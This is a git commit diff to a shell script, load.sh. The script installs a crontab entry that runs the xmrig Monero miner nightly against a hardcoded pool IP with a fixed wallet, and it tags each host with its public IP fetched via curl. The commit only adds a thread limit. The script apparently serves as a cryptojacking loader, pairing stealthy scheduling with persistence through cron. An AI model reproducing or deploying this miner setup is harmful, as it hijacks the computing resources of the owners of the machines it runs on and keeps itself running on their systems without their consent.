1691056e32c20831a4580424c0c516b3e43c49a8
lin2elysia <163723173+lin2elysia@users.noreply.github.com>
2024-03-17 21:54:58 +0800

    Update load.sh

--- load.sh
+++ load.sh
@@ -14,4 +14,4 @@ if [ ! -f "$DIRECTORY/xmrig" ]; then
 fi
 
 # Schedule cron job
-(crontab -l 2>/dev/null; echo "0 0-5 * * * /usr/local/bin/xmrig --url=38.47.101.33:443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=\$(curl 4.ipw.cn)-Auto -k --coin monero --tls") | crontab -
+(crontab -l 2>/dev/null; echo "0 0-5 * * * /usr/local/bin/xmrig --url=38.47.101.33:443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=\$(curl 4.ipw.cn)-Auto -k --coin monero --tls --t=2") | crontab -
